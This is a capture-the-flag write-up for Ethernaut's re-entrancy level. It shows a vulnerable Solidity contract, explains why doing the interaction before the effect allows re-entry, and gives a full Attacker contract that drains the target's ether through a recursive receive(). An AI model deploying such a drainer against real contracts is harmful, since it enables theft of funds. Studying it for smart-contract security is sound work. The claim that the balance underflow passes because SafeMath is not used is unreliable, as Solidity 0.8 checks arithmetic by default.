# Ethernaut: 10. Re-entrancy

**Objective of CTF:**

- Steal all the funds from the contract.

**Target contract:**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if (balances[msg.sender] >= _amount) {
      (bool result, ) = msg.sender.call{value: _amount}("");
      if (result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

There is a pattern called [Checks - Effects - Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) in Solidity.
Basically:

1. you **check** whether you can do something, such as checking balance
2. you apply the **effects** of doing it on your contract, such as updating balance
3. you do the actual **interactions** on-chain with other, such as transferring money

In this case, the function is `withdraw` but the **interaction** comes before the **effect**. This means that when we receive money from within the `withdraw`, things are briefly in our control until the program goes back to the `withdraw` function to do the effect. When we have the control, we can call `withdraw` once more and the same thing will happen again and again.

When we create the instance in this game, we can see that: - `await getBalance(contract.address)` is 0.001 ether. - `await contract.balanceOf(player)` is 0.

We will donate some money to create our initial balance at the target, which will allow the `balances[msg.sender] >= _amount` to be true. Now, we can repeadetly withdraw that amount by re-entering the withdraw function. Since balance update effect happens after the transfer interaction, we will go on and on until the balance is depleted. As a defense, you could use a pull-payment approach: the user to be paid must come and withdraw their money themselves, rather than us paying to them.

Note that `balance[msg.sender]` will underflow as we will subtract more `_amount` than what is donated to there, but SafeMath was not used for this line so we are ok.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

// Interface of the target contract
interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Attacker {
  address public owner;
  IReentrance targetContract;
  uint targetValue = 0.001 ether;

  constructor(address payable _targetAddr) payable {
    targetContract = IReentrance(_targetAddr);
    owner = msg.sender;
  }

  // withdraw money from this contract
  function withdraw() public {
    require(msg.sender == owner, "Only the owner can withdraw.");
    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
    require(sent, "Failed to withdraw.");
  }

  // begin attack by depositing and withdrawing
  function attack() public payable {
    require(msg.value >= targetValue);
    targetContract.donate{value:msg.value}(address(this));
    targetContract.withdraw(msg.value);
    targetValue = msg.value;
  }

  receive() external payable {
    uint targetBalance = address(targetContract).balance;
    if (targetBalance >= targetValue) {
      // withdraw at most your balance at a time
      targetContract.withdraw(targetValue);
    } else if (targetBalance > 0) {
      // withdraw the remaining balance in the contract
      targetContract.withdraw(targetBalance);
    }
  }
}
```

This is how "The DAO" hack was executed, which resulted in the creation of Ethereum Classic; pretty mind-blowing to think just the misplacement of two lines caused a million-dollar hack!
